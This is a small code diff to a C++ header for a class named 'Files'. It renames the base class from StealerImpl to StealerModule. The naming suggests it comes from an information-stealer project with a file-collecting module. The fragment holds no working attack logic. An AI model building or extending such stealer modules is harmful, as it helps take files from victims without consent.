@@ -6,9 +6,9 @@
 #define STEALER_FILES_H
 
 
-#include "../../StealerImpl.h"
+#include "../../StealerModule.h"
 
-class Files : public StealerImpl {
+class Files : public StealerModule {
 public:
     void execute(fs::path& root) override;
 private:
